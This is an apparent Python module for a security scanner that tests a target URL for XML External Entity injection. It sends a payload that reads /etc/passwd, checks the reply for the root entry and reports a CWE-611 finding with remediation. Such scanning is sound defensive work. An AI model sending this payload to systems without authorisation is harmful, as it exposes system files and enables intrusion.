"""XXE Scanner"""

import time
from typing import List

import httpx

from cherenkov.core.base_scanner import BaseScanner, Finding, ScanResult, Severity


class XXEScanner(BaseScanner):
    """Scanner to detect XML External Entity (XXE) vulnerabilities."""

    def __init__(self, name: str = "", description: str = ""):
        super().__init__(name, description)

    async def scan(self, target: str, timeout: float = 10.0) -> ScanResult:
        """Execute the scan - sending XML payload to the target."""
        start_time = time.time()
        findings: List[Finding] = []

        # We need to construct an XXE payload
        xxe_payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

        try:
            # We must use httpx.AsyncClient here per requirements, zero outbound calls beyond target URL
            async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                response = await client.post(
                    target,
                    content=xxe_payload,
                    headers={"Content-Type": "application/xml"},
                    follow_redirects=True,
                )

                # Check if we got root:x:0:0: pattern in response text
                if response.status_code == 200 and "root:x:0:0:" in response.text:
                    findings.append(
                        Finding(
                            title="XML External Entity (XXE) Injection",
                            severity=Severity.HIGH,
                            description="The application is vulnerable to XXE injection. An external entity was successfully resolved, exposing local file contents (/etc/passwd).",
                            cwe="CWE-611",
                            remediation="Disable external entity resolution in the XML parser. For Python defusedxml or similar safe parsers should be used.",
                        )
                    )
        except (httpx.RequestError, httpx.TimeoutException):
            pass  # Ignore request errors to avoid failing the scan, return empty findings

        duration_ms = (time.time() - start_time) * 1000

        return ScanResult(
            target=target,
            scanner_name=self.name,
            findings=findings,
            duration_ms=duration_ms,
            status="completed",
        )
